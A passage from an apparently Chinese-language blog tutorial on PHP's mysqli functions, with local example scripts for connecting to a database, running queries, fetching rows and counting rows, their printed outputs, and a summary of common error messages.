class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//(1)数据库配置信息</span></span><br><span class="line">$db_host = <span class="string">&quot;127.0.0.1&quot;</span>;<span class="comment">//主机名  localhost:3306</span></span><br><span class="line">$db_port = <span class="string">&quot;3306&quot;</span>;<span class="comment">//端口号</span></span><br><span class="line">$db_user = <span class="string">&quot;root123&quot;</span>;<span class="comment">//用户名，这里设置一个错误的用户名。</span></span><br><span class="line">$db_pass = <span class="string">&quot;root&quot;</span>;<span class="comment">//密码</span></span><br><span class="line">$db_name = <span class="string">&quot;test&quot;</span>;<span class="comment">//数据库名</span></span><br><span class="line">$charset = <span class="string">&quot;utf8&quot;</span>;<span class="comment">//字符集</span></span><br><span class="line">$link=mysqli_connect($db_host.<span class="string">&quot;:&quot;</span>.$db_port,$db_user,$db_pass);</span><br><span class="line"><span class="keyword">if</span>(!$link=@mysqli_connect($db_host.<span class="string">&quot;:&quot;</span>.$db_port,$db_user,$db_pass))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;数据库连接错误&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;错误信息为:&quot;</span>.mysqli_connect_error();</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;steady is a good hacker&quot;</span>;<span class="comment">//该语句不会运行。</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">数据库连接错误</span><br><span class="line">错误信息为:Access denied <span class="keyword">for</span> user <span class="string">&#x27;root123&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span> (using password: YES)</span><br></pre></td></tr></table></figure><h4 id="mysqli-close"><a href="#mysqli-close" class="headerlink" title="mysqli_close()"></a>mysqli_close()</h4><p>描述：关闭先前打开的数据库连接</p><p>语法：<code>bool mysqli_close ( mysqli $link )</code></p><h4 id="选择当前数据库"><a href="#选择当前数据库" class="headerlink" title="选择当前数据库"></a>选择当前数据库</h4><p>描述：一个数据库服务器可能包含很多的数据库，通常需要针对某个具体的数据库进行编程</p><p>语法：<code>bool mysqli_select_db(mysqli $link, string $database)</code></p><p>返回值：如果成功返回TRUE，失败则返回FALSE。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//(1)数据库配置信息</span></span><br><span class="line">$db_host = <span class="string">&quot;127.0.0.1&quot;</span>;<span class="comment">//主机名  localhost:3306</span></span><br><span class="line">$db_port = <span class="string">&quot;3306&quot;</span>;<span class="comment">//端口号</span></span><br><span class="line">$db_user = <span class="string">&quot;root&quot;</span>;<span class="comment">//用户名</span></span><br><span class="line">$db_pass = <span class="string">&quot;root&quot;</span>;<span class="comment">//密码</span></span><br><span class="line">$db_name = <span class="string">&quot;test&quot;</span>;<span class="comment">//数据库名</span></span><br><span class="line">$charset = <span class="string">&quot;utf8&quot;</span>;<span class="comment">//字符集</span></span><br><span class="line">$link=mysqli_connect($db_host.<span class="string">&quot;:&quot;</span>.$db_port,$db_user,$db_pass);</span><br><span class="line"><span class="keyword">if</span>(!mysqli_select_db($link,$db_name))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;选择数据库<span class="subst">&#123;$db_name&#125;</span>失败！&lt;/h2&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">die</span>();</span><br><span class="line">&#125;<span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;数据库<span class="subst">&#123;$db_name&#125;</span>连接成功。&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">数据库test连接成功。</span><br></pre></td></tr></table></figure><h4 id="设置客户端字符集"><a href="#设置客户端字符集" class="headerlink" title="设置客户端字符集"></a>设置客户端字符集</h4><p>描述：设置默认字符编码</p><p>语法：<code>bool mysqli_set_charset ( mysqli $link , string $charset )</code></p><p>返回：成功时返回 TRUE， 或者在失败时返回 FALSE。</p><h3 id="执行各种SQL语句"><a href="#执行各种SQL语句" class="headerlink" title="执行各种SQL语句"></a>执行各种SQL语句</h3><h4 id="mysqli-query"><a href="#mysqli-query" class="headerlink" title="mysqli_query()"></a>mysqli_query()</h4><p>描述：发送一条 MySQL 查询；</p><p>语法：<code>resource mysqli_query(mysqli $link , string $query )</code></p><p>参数：</p><p>$query是查询字符串；</p><p>$link是创建的活动的数据库连接；</p><p>说明：mysqli_query() 仅对 SELECT，SHOW 或 DESCRIBE 语句返回一个<code>mysqli_result结果集对象</code>，如果查询执行不正确则返回 FALSE。对于其它类型的 SQL 语句，mysqli_query()在执行成功时返回 TRUE，出错时返回 FALSE。非 FALSE 的返回值意味着查询是合法的并能够被服务器执行。 </p><p>注意：查询字符串不应以分号结束，和命令行模式下有区别。</p><p><code>select</code>语句</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//(1)数据库配置信息</span></span><br><span class="line">ini_set(<span class="string">&#x27;display_errors&#x27;</span>,<span class="number">1</span>);</span><br><span class="line">$db_host = <span class="string">&quot;127.0.0.1&quot;</span>;<span class="comment">//主机名  localhost:3306</span></span><br><span class="line">$db_port = <span class="string">&quot;3306&quot;</span>;<span class="comment">//端口号</span></span><br><span class="line">$db_user = <span class="string">&quot;root&quot;</span>;<span class="comment">//用户名</span></span><br><span class="line">$db_pass = <span class="string">&quot;root&quot;</span>;<span class="comment">//密码</span></span><br><span class="line">$db_name = <span class="string">&quot;test&quot;</span>;<span class="comment">//数据库名</span></span><br><span class="line">$charset = <span class="string">&quot;utf8&quot;</span>;<span class="comment">//字符集</span></span><br><span class="line">$link=mysqli_connect($db_host.<span class="string">&quot;:&quot;</span>.$db_port,$db_user,$db_pass,$db_name);</span><br><span class="line">$sql=<span class="string">&quot;select * from math&quot;</span>;</span><br><span class="line">$resault=mysqli_query($link,$sql);</span><br><span class="line">var_dump($resault);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;Applications&#x2F;MAMP&#x2F;htdocs&#x2F;steady.php:13:</span><br><span class="line">object(mysqli_result)[2]</span><br><span class="line">  public &#39;current_field&#39; &#x3D;&gt; int 0</span><br><span class="line">  public &#39;field_count&#39; &#x3D;&gt; int 2</span><br><span class="line">  public &#39;lengths&#39; &#x3D;&gt; null</span><br><span class="line">  public &#39;num_rows&#39; &#x3D;&gt; int 18</span><br><span class="line">  public &#39;type&#39; &#x3D;&gt; int 0</span><br></pre></td></tr></table></figure><p>查询成功返回一个结果集，查询失败返回False。</p><p><code>Update</code>语句</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//(1)数据库配置信息</span></span><br><span class="line">ini_set(<span class="string">&#x27;display_errors&#x27;</span>,<span class="number">1</span>);</span><br><span class="line">$db_host = <span class="string">&quot;127.0.0.1&quot;</span>;<span class="comment">//主机名  localhost:3306</span></span><br><span class="line">$db_port = <span class="string">&quot;3306&quot;</span>;<span class="comment">//端口号</span></span><br><span class="line">$db_user = <span class="string">&quot;root&quot;</span>;<span class="comment">//用户名</span></span><br><span class="line">$db_pass = <span class="string">&quot;root&quot;</span>;<span class="comment">//密码</span></span><br><span class="line">$db_name = <span class="string">&quot;test&quot;</span>;<span class="comment">//数据库名</span></span><br><span class="line">$charset = <span class="string">&quot;utf8&quot;</span>;<span class="comment">//字符集</span></span><br><span class="line">$link=mysqli_connect($db_host.<span class="string">&quot;:&quot;</span>.$db_port,$db_user,$db_pass,$db_name);</span><br><span class="line">$sql=<span class="string">&#x27;update math set name=&quot;steady&quot; where id=3&#x27;</span>;</span><br><span class="line">$resault=mysqli_query($link,$sql);</span><br><span class="line">var_dump($resault);</span><br><span class="line"><span class="comment">#$arr=mysqli_fetch_row($resault);</span></span><br><span class="line"><span class="comment">#print_r($arr)</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;Applications&#x2F;MAMP&#x2F;htdocs&#x2F;steady.php:13:boolean true</span><br></pre></td></tr></table></figure><p>执行正确返回true，执行错误返回false。</p><h4 id="mysqli-free-result"><a href="#mysqli-free-result" class="headerlink" title="mysqli_free_result()"></a>mysqli_free_result()</h4><p>描述：释放与结果集相关联的内存</p><p>语法：<code>void mysqli_free_result ( mysqli_result $result )</code></p><p>参数：$result为结果集对象。</p><p>内存中的变量何时消失：</p><p>(1)网页执行完毕，所有与本网页相关的变量自动销毁；</p><p>(2)手动销毁指定的变量。</p><h3 id="从结果集获取一行数据"><a href="#从结果集获取一行数据" class="headerlink" title="从结果集获取一行数据"></a>从结果集获取一行数据</h3><h4 id="mysqli-fetch-row"><a href="#mysqli-fetch-row" class="headerlink" title="mysqli_fetch_row()"></a>mysqli_fetch_row()</h4><p>描述：从结果集中取得一行作为枚举数组；</p><p>格式：<code>array mysqli_fetch_row ( mysqli_result  $result )</code></p><p>返回：返回根据所取得的行生成的数组，如果没有更多行则返回 FALSE。</p><p>说明：mysqli_fetch_row() 从指定的结果标识关联的结果集中取得一行数据并作为数组返回。每个结果的列储存在一个数组的单元中，偏移量从 0 开始。</p><p>提示：依次调用mysqli_fetch_row()将返回结果集中的下一行，如果没有更多行则返回FALSE。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//(1)数据库配置信息</span></span><br><span class="line">ini_set(<span class="string">&#x27;display_errors&#x27;</span>,<span class="number">1</span>);</span><br><span class="line">$db_host = <span class="string">&quot;127.0.0.1&quot;</span>;<span class="comment">//主机名  localhost:3306</span></span><br><span class="line">$db_port = <span class="string">&quot;3306&quot;</span>;<span class="comment">//端口号</span></span><br><span class="line">$db_user = <span class="string">&quot;root&quot;</span>;<span class="comment">//用户名</span></span><br><span class="line">$db_pass = <span class="string">&quot;root&quot;</span>;<span class="comment">//密码</span></span><br><span class="line">$db_name = <span class="string">&quot;test&quot;</span>;<span class="comment">//数据库名</span></span><br><span class="line">$charset = <span class="string">&quot;utf8&quot;</span>;<span class="comment">//字符集</span></span><br><span class="line">$link=mysqli_connect($db_host.<span class="string">&quot;:&quot;</span>.$db_port,$db_user,$db_pass,$db_name);</span><br><span class="line">$sql=<span class="string">&#x27;select * from math&#x27;</span>;</span><br><span class="line">$resault=mysqli_query($link,$sql);</span><br><span class="line">$arr=mysqli_fetch_row($resault);</span><br><span class="line">$arr1=mysqli_fetch_row($resault);</span><br><span class="line">print_r($arr);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">print_r($arr1);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Array ( [0] &#x3D;&gt; 1 [1] &#x3D;&gt; gongxinao )</span><br><span class="line">Array ( [0] &#x3D;&gt; 1 [1] &#x3D;&gt; 李明 )</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//(1)数据库配置信息</span></span><br><span class="line">ini_set(<span class="string">&#x27;display_errors&#x27;</span>,<span class="number">1</span>);</span><br><span class="line">$db_host = <span class="string">&quot;127.0.0.1&quot;</span>;<span class="comment">//主机名  localhost:3306</span></span><br><span class="line">$db_port = <span class="string">&quot;3306&quot;</span>;<span class="comment">//端口号</span></span><br><span class="line">$db_user = <span class="string">&quot;root&quot;</span>;<span class="comment">//用户名</span></span><br><span class="line">$db_pass = <span class="string">&quot;root&quot;</span>;<span class="comment">//密码</span></span><br><span class="line">$db_name = <span class="string">&quot;test&quot;</span>;<span class="comment">//数据库名</span></span><br><span class="line">$charset = <span class="string">&quot;utf8&quot;</span>;<span class="comment">//字符集</span></span><br><span class="line">$link=mysqli_connect($db_host.<span class="string">&quot;:&quot;</span>.$db_port,$db_user,$db_pass,$db_name);</span><br><span class="line">$sql=<span class="string">&#x27;select * from math&#x27;</span>;</span><br><span class="line">$resault=mysqli_query($link,$sql);</span><br><span class="line"><span class="keyword">while</span>($arr=mysqli_fetch_row($resault))</span><br><span class="line">&#123;</span><br><span class="line">    print_r($arr);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">Array</span></span><br><span class="line">(</span><br><span class="line">    [<span class="number">0</span>] =&gt; <span class="number">1</span></span><br><span class="line">    [<span class="number">1</span>] =&gt; gongxinao</span><br><span class="line">)</span><br><span class="line"><span class="keyword">Array</span></span><br><span class="line">(</span><br><span class="line">    [<span class="number">0</span>] =&gt; <span class="number">1</span></span><br><span class="line">    [<span class="number">1</span>] =&gt; 李明</span><br><span class="line">)</span><br><span class="line"><span class="keyword">Array</span></span><br><span class="line">(</span><br><span class="line">    [<span class="number">0</span>] =&gt; <span class="number">1</span></span><br><span class="line">    [<span class="number">1</span>] =&gt; gongxinao</span><br><span class="line">)</span><br></pre></td></tr></table></figure><h4 id="mysqli-fetch-assoc"><a href="#mysqli-fetch-assoc" class="headerlink" title="mysqli_fetch_assoc()"></a>mysqli_fetch_assoc()</h4><p>描述：从结果集中取得一行作为关联数组</p><p>语法：<code>array mysqli_fetch_assoc ( mysqli_result  $result )</code></p><p>返回值：从结果集取得的行生成的关联数组，如果没有更多行则返回 FALSE；</p><p>注意：此函数返回的字段名大小写敏感。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//(1)数据库配置信息</span></span><br><span class="line">ini_set(<span class="string">&#x27;display_errors&#x27;</span>,<span class="number">1</span>);</span><br><span class="line">$db_host = <span class="string">&quot;127.0.0.1&quot;</span>;<span class="comment">//主机名  localhost:3306</span></span><br><span class="line">$db_port = <span class="string">&quot;3306&quot;</span>;<span class="comment">//端口号</span></span><br><span class="line">$db_user = <span class="string">&quot;root&quot;</span>;<span class="comment">//用户名</span></span><br><span class="line">$db_pass = <span class="string">&quot;root&quot;</span>;<span class="comment">//密码</span></span><br><span class="line">$db_name = <span class="string">&quot;test&quot;</span>;<span class="comment">//数据库名</span></span><br><span class="line">$charset = <span class="string">&quot;utf8&quot;</span>;<span class="comment">//字符集</span></span><br><span class="line">$link=mysqli_connect($db_host.<span class="string">&quot;:&quot;</span>.$db_port,$db_user,$db_pass,$db_name);</span><br><span class="line">$sql=<span class="string">&#x27;select * from math&#x27;</span>;</span><br><span class="line">$resault=mysqli_query($link,$sql);</span><br><span class="line">$arr=mysqli_fetch_assoc($resault);</span><br><span class="line">print_r($arr);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Array ( [id] &#x3D;&gt; 1 [name] &#x3D;&gt; gongxinao )</span><br></pre></td></tr></table></figure><h4 id="mysqli-fetch-array"><a href="#mysqli-fetch-array" class="headerlink" title="mysqli_fetch_array()"></a>mysqli_fetch_array()</h4><p>描述：从结果集中取得一行作为关联数组，或数字数组，或二者兼有；</p><p>语法：<code>array mysqli_fetch_array ( mysqli_result  $result  [, int $result_type = MYSQLI_BOTH ] )</code></p><p>参数：$result_type是一个常量，取值：MYSQLI_BOTH(两者兼有，默认)、MYSQLI_ASSOC(关联索引)、MYSQLI_NUM(数字索引)</p><p>返回：返回根据从结果集取得的行生成的数组，如果没有更多行则返回 FALSE。</p><p>注意：本函数返回的字段名区分大小写。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//(1)数据库配置信息</span></span><br><span class="line">ini_set(<span class="string">&#x27;display_errors&#x27;</span>,<span class="number">1</span>);</span><br><span class="line">$db_host = <span class="string">&quot;127.0.0.1&quot;</span>;<span class="comment">//主机名  localhost:3306</span></span><br><span class="line">$db_port = <span class="string">&quot;3306&quot;</span>;<span class="comment">//端口号</span></span><br><span class="line">$db_user = <span class="string">&quot;root&quot;</span>;<span class="comment">//用户名</span></span><br><span class="line">$db_pass = <span class="string">&quot;root&quot;</span>;<span class="comment">//密码</span></span><br><span class="line">$db_name = <span class="string">&quot;test&quot;</span>;<span class="comment">//数据库名</span></span><br><span class="line">$charset = <span class="string">&quot;utf8&quot;</span>;<span class="comment">//字符集</span></span><br><span class="line">$link=mysqli_connect($db_host.<span class="string">&quot;:&quot;</span>.$db_port,$db_user,$db_pass,$db_name);</span><br><span class="line">$sql=<span class="string">&#x27;select * from math&#x27;</span>;</span><br><span class="line">$resault=mysqli_query($link,$sql);</span><br><span class="line">$arr=mysqli_fetch_array($resault);</span><br><span class="line">print_r($arr);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Array ( [0] &#x3D;&gt; 1 [id] &#x3D;&gt; 1 [1] &#x3D;&gt; gongxinao [name] &#x3D;&gt; gongxinao )</span><br></pre></td></tr></table></figure><h4 id="mysqli-fetch-all"><a href="#mysqli-fetch-all" class="headerlink" title="mysqli_fetch_all()"></a>mysqli_fetch_all()</h4><p>描述：从结果集中取得所有行作为关联数组、枚举数组、或二者兼有</p><p>语法：<code>mixed mysqli_fetch_all ( mysqli_result $result [, int $resulttype = MYSQLI_NUM ] )</code></p><h3 id="获取记录数"><a href="#获取记录数" class="headerlink" title="获取记录数"></a>获取记录数</h3><h4 id="mysqli-num-rows"><a href="#mysqli-num-rows" class="headerlink" title="mysqli_num_rows()"></a>mysqli_num_rows()</h4><p>描述：取得结果集中行的数目 </p><p>语法：<code>int mysqli_num_rows ( mysqli_result  $result )</code></p><p>说明：mysqli_num_rows()返回结果集中行的数目。</p><p>注意：此命令仅对 SELECT 语句有效。 </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//(1)数据库配置信息</span></span><br><span class="line">ini_set(<span class="string">&#x27;display_errors&#x27;</span>,<span class="number">1</span>);</span><br><span class="line">$db_host = <span class="string">&quot;127.0.0.1&quot;</span>;<span class="comment">//主机名  localhost:3306</span></span><br><span class="line">$db_port = <span class="string">&quot;3306&quot;</span>;<span class="comment">//端口号</span></span><br><span class="line">$db_user = <span class="string">&quot;root&quot;</span>;<span class="comment">//用户名</span></span><br><span class="line">$db_pass = <span class="string">&quot;root&quot;</span>;<span class="comment">//密码</span></span><br><span class="line">$db_name = <span class="string">&quot;test&quot;</span>;<span class="comment">//数据库名</span></span><br><span class="line">$charset = <span class="string">&quot;utf8&quot;</span>;<span class="comment">//字符集</span></span><br><span class="line">$link=mysqli_connect($db_host.<span class="string">&quot;:&quot;</span>.$db_port,$db_user,$db_pass,$db_name);</span><br><span class="line">$sql=<span class="string">&#x27;select * from math&#x27;</span>;</span><br><span class="line">$resault=mysqli_query($link,$sql);</span><br><span class="line">$num=mysqli_num_rows($resault);</span><br><span class="line"><span class="keyword">print</span>($num);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">18</span><br></pre></td></tr></table></figure><h4 id="mysqli-affected-rows"><a href="#mysqli-affected-rows" class="headerlink" title="mysqli_affected_rows()"></a>mysqli_affected_rows()</h4><p>描述：取得前一次 MySQL 操作所影响的记录行数；</p><p>语法：<code>int mysqli_affected_rows ( mysqli $link )</code></p><p>说明：取得最近一次与 $link 关联的 SELECT、INSERT、UPDATE 或 DELETE 查询所影响的记录行数。 </p><p>注意：如果最近一次查询失败，函数返回-1。当使用UPDATE查询，MySQL不会将原值和新值一样的值更新，返回值不一定就是查询条件所符合的记录，只有修改过的记录数才会被返回。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//(1)数据库配置信息</span></span><br><span class="line">ini_set(<span class="string">&#x27;display_errors&#x27;</span>,<span class="number">1</span>);</span><br><span class="line">$db_host = <span class="string">&quot;127.0.0.1&quot;</span>;<span class="comment">//主机名  localhost:3306</span></span><br><span class="line">$db_port = <span class="string">&quot;3306&quot;</span>;<span class="comment">//端口号</span></span><br><span class="line">$db_user = <span class="string">&quot;root&quot;</span>;<span class="comment">//用户名</span></span><br><span class="line">$db_pass = <span class="string">&quot;root&quot;</span>;<span class="comment">//密码</span></span><br><span class="line">$db_name = <span class="string">&quot;test&quot;</span>;<span class="comment">//数据库名</span></span><br><span class="line">$charset = <span class="string">&quot;utf8&quot;</span>;<span class="comment">//字符集</span></span><br><span class="line">$link=mysqli_connect($db_host.<span class="string">&quot;:&quot;</span>.$db_port,$db_user,$db_pass,$db_name);</span><br><span class="line">$sql=<span class="string">&#x27;select * from math&#x27;</span>;</span><br><span class="line">$resault=mysqli_query($link,$sql);</span><br><span class="line">$num=mysqli_affected_rows($link);</span><br><span class="line"><span class="keyword">print</span>(<span class="string">&quot;一共查询数据的行数为：&quot;</span>.$num);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">一共查询数据的行数为：18</span><br></pre></td></tr></table></figure><h2 id="mysql各种获取数据函数报错总结"><a href="#mysql各种获取数据函数报错总结" class="headerlink" title="mysql各种获取数据函数报错总结"></a>mysql各种获取数据函数报错总结</h2><h4 id="mysqli-connect-1"><a href="#mysqli-connect-1" class="headerlink" title="mysqli_connect()"></a>mysqli_connect()</h4><p>连接成功：返回一个mysqli对象。</p><p>连接失败：返回对应的报错信息，比如如果数据库密码错误返回<code>( ! ) Warning: mysqli_connect(): (HY000/1045): Access denied for user  &#39;root&#39;@&#39;localhost&#39; (using password: YES) in  /Applications/MAMP/htdocs/phpinfo.php on line *10*</code>。</p><h4 id="mysqli-query-1"><a href="#mysqli-query-1" class="headerlink" title="mysqli_query()"></a>mysqli_query()</h4><h5 id="SELECT，SHOW-或-DESCRIBE-语句"><a href="#SELECT，SHOW-或-DESCRIBE-语句" class="headerlink" title="SELECT，SHOW 或 DESCRIBE 语句"></a>SELECT，SHOW 或 DESCRIBE 语句</h5><p>查询成功：返回一个结果集。<code>mysqli_result</code>。</p><p>查询失败：返回false，<code>boolean false</code>。</p><h5 id="其它类型的-SQL-语句"><a href="#其它类型的-SQL-语句" class="headerlink" title="其它类型的 SQL 语句"></a>其它类型的 SQL 语句</h5><p>查询成功：返回true。</p><p>查询失败：返回false。</p><h4 id="mysqli-fetch-all-、mysqli-fetch-array-、mysqli-fetch-assoc-、mysqli-fetch-row"><a href="#mysqli-fetch-all-、mysqli-fetch-array-、mysqli-fetch-assoc-、mysqli-fetch-row" class="headerlink" title="mysqli_fetch_all()、mysqli_fetch_array()、mysqli_fetch_assoc()、mysqli_fetch_row()"></a>mysqli_fetch_all()、mysqli_fetch_array()、mysqli_fetch_assoc()、mysqli_fetch_row()</h4><p>接受参数为数据库语句执行产生的结果集，一般的报错就是因为数据库语句执行失败导致，最常见的报错语句为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Warning: mysqli_fetch_all() expects parameter 1 to be mysqli_result, boolean given in &#x2F;Applications&#x2F;MAMP&#x2F;htdocs&#x2F;phpinfo.php on line 13</span><br></pre></td></tr></table></figure><h4 id="mysqli-num-rows-1"><a href="#mysqli-num-rows-1" class="headerlink" title="mysqli_num_rows()"></a>mysqli_num_rows()</h4><p>常见错误</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Warning: mysqli_num_rows() expects parameter 1 to be mysqli_result, boolean given in &#x2F;Applications&#x2F;MAMP&#x2F;htdocs&#x2F;phpinfo.php on line 13</span><br></pre></td></tr></table></figure><p>以上报错的基础是php开启了报错模式。比如</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ini_set(<span class="string">&#x27;display_errors&#x27;</span>,<span class="number">0</span>);</span><br></pre></td></tr></table></figure><h2 id="学生管理系统"><a href="#学生管理系统" class="headerlink" title="学生管理系统"></a>学生管理系统</h2><h4 id="创建数据库"><a href="#创建数据库" class="headerlink" title="创建数据库"></a>创建数据库</h4><figure class="highlight 